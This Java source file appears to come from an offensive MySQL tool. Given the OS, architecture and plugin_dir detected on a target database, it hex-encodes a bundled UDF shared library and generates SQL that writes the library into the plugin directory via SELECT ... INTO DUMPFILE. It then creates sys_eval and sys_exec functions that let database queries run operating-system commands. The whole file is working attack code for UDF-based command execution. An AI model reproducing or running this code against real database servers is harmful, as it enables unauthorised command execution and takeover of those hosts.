package controller.udf;

import java.io.IOException;
import java.io.InputStream;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class udfMysql {

    private static final int CHUNK_SIZE = 4096;

    /**
     * 将资源文件转为写入 plugin_dir 的 SQL，并创建 UDF
     * 采用 SELECT 0xHEX INTO DUMPFILE 写入完整二进制
     */
    private static List<String> convertFileToSQL(InputStream is, String targetPath, String libFileName) throws IOException {
        List<String> sqlList = new ArrayList<>();
        byte[] buffer = new byte[CHUNK_SIZE];
        int bytesRead;
        StringBuilder hex = new StringBuilder();

        while ((bytesRead = is.read(buffer)) != -1) {
            for (int i = 0; i < bytesRead; i++) {
                hex.append(String.format("%02x", buffer[i]));
            }
        }

        String writeSql = "SELECT 0x" + hex + " INTO DUMPFILE '" + targetPath + "';";
        sqlList.add(writeSql);

        sqlList.add("DROP FUNCTION IF EXISTS sys_eval;");
        sqlList.add("DROP FUNCTION IF EXISTS sys_exec;");

        String createEval = "CREATE FUNCTION sys_eval RETURNS STRING SONAME '" + libFileName + "';";
        String createExec = "CREATE FUNCTION sys_exec RETURNS STRING SONAME '" + libFileName + "';";
        sqlList.add(createEval);
        sqlList.add(createExec);

        return sqlList;
    }

    /**
     * 从 resources 中获取唯一文件的路径，如果不存在返回 null
     */
    private static String getSingleFileResourcePath(String resourceDir) {
        try {
            if (resourceDir.endsWith("/")) resourceDir = resourceDir.substring(0, resourceDir.length() - 1);

            URL url = udfMysql.class.getResource(resourceDir);
            if (url == null) return null;

            if ("file".equals(url.getProtocol())) {
                Path path = Paths.get(url.toURI());
                try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                    for (Path p : stream) {
                        if (Files.isRegularFile(p)) {
                            return resourceDir + "/" + p.getFileName().toString();
                        }
                    }
                    return null;
                }
            } else if ("jar".equals(url.getProtocol())) {
                String jarPath = url.getPath().substring(5, url.getPath().indexOf("!"));
                try (JarFile jar = new JarFile(jarPath)) {
                    Enumeration<JarEntry> entries = jar.entries();
                    String prefix = resourceDir.startsWith("/") ? resourceDir.substring(1) + "/" : resourceDir + "/";
                    while (entries.hasMoreElements()) {
                        JarEntry entry = entries.nextElement();
                        if (!entry.isDirectory() && entry.getName().startsWith(prefix)) {
                            return "/" + entry.getName();
                        }
                    }
                    return null;
                }
            } else {
                return null;
            }
        } catch (IOException | URISyntaxException e) {
            return null;
        }
    }

    /**
     * 根据 MySQL 环境信息生成预处理 SQL：写入 UDF 库并创建 sys_eval
     * 如果资源不存在，返回空 List，跳过
     * @param os      windows/linux/mac/other
     * @param bits    64/32/unknown
     * @param pluginDir  MySQL 插件目录（来自 SHOW VARIABLES LIKE 'plugin_dir'）
     */
    public static List<String> branch(String os, String bits, String pluginDir, String sqlMode) {
        List<String> sqlList = new ArrayList<>();

        if (pluginDir == null || pluginDir.isEmpty()) {
            System.out.println("[!] 未检测到 plugin_dir，跳过 UDF 预处理");
            return sqlList;
        }

        String fileSep = pluginDir.contains("\\") ? "\\" : "/";
        String normalized = pluginDir.replace("\\", fileSep).replace("/", fileSep);
        if (!normalized.endsWith(fileSep)) normalized += fileSep;

        String resourceDir = "/udf/mysql/" + os + "/" + bits + "/";
        String resourcePath;
        try {
            resourcePath = getSingleFileResourcePath(resourceDir);
        } catch (Exception e) {
            System.out.println("[!] 资源目录不存在: " + resourceDir + ", 已跳过");
            return sqlList;
        }

        if (resourcePath == null) {
            System.out.println("[!] 未找到 UDF 资源文件: " + resourceDir + ", 已跳过");
            return sqlList;
        }

        String libFileName = resourcePath.substring(resourcePath.lastIndexOf('/') + 1);
        String targetPath = normalized + libFileName;

        // Windows 下根据 sql_mode 判断是否需要双反斜杠转义
        if ("windows".equalsIgnoreCase(os)) {
            String mode = sqlMode != null ? sqlMode.toUpperCase() : "";
            boolean noBackslashEscapes = mode.contains("NO_BACKSLASH_ESCAPES");
            if (!noBackslashEscapes) {
                targetPath = targetPath.replace("\\", "\\\\");
            }
        }

        try (InputStream is = udfMysql.class.getResourceAsStream(resourcePath)) {
            if (is == null) {
                System.out.println("[!] 资源文件读取失败: " + resourcePath + ", 已跳过");
                return sqlList;
            }
            sqlList.addAll(convertFileToSQL(is, targetPath, libFileName));
        } catch (IOException e) {
            System.out.println("[!] 文件读取失败: " + resourcePath + ", 已跳过");
        }

        return sqlList;
    }
}